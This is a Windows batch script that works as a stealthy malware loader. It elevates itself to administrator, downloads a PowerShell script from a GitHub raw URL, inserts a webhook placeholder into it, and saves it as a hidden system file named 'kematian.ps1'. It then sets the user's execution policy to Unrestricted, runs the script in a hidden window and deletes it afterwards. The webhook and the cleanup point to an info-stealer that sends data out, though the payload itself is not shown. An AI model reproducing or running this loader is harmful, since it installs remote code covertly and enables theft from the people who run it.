@echo off
cd /d %~dp0
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'kematian.ps1' -Encoding ASCII"
attrib +h +s kematian.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file kematian.ps1
attrib -h -s kematian.ps1
del kematian.ps1 /f /q
timeout 3 > nul
exit
